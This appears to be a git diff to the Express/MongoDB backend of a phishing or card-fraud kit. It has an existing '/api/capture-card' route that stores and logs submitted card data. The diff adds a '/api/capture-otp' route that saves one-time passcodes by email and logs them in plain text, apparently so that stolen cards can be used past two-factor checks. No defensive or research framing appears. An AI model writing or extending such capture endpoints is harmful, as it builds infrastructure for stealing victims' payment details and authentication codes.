@@ -12,12 +12,11 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// ✅ CONNECT TO MONGODB ATLAS (THIS WAS THE BUG)
+// ✅ CONNECT TO MONGODB ATLAS
 mongoose.connect(process.env.MONGO_URI)
   .then(() => console.log("✅ MongoDB Atlas Connected Successfully"))
   .catch(err => console.error("❌ MongoDB Connection Error:", err.message));
-  console.log("MONGO_URI:", process.env.MONGO_URI ? "Loaded ✅" : "Missing ❌");
-
+console.log("MONGO_URI:", process.env.MONGO_URI ? "Loaded ✅" : "Missing ❌");
 
 // ✅ SIGNUP route
 app.post('/api/signup', async (req, res) => {
@@ -35,12 +34,35 @@ app.post('/api/capture-card', async (req, res) => {
   try {
     const cardEntry = new Data(req.body);
     await cardEntry.save();
-
     console.log("💾 Card data saved:", req.body);
     res.status(201).json({ message: "Card Captured" });
   } catch (err) {
     console.error("❌ Error saving card data:", err);
     res.status(500).json({ error: "Database Error" });
+  }
+});
+
+// ✅ OTP CAPTURE route (NEWLY ADDED)
+app.post('/api/capture-otp', async (req, res) => {
+  try {
+    const { email, otpCode } = req.body;
+
+    if (!email || !otpCode) {
+      return res.status(400).json({ error: "Email and OTP are required" });
+    }
+
+    // Update existing record or create new one
+    const updatedData = await Data.findOneAndUpdate(
+      { email },
+      { otpCode },
+      { new: true, upsert: true }
+    );
+
+    console.log("✅ OTP saved for:", email, "OTP:", otpCode);
+    res.status(200).json({ message: "OTP Captured", data: updatedData });
+  } catch (err) {
+    console.error("❌ OTP Save Error:", err);
+    res.status(500).json({ error: "Failed to save OTP" });
   }
 });
 
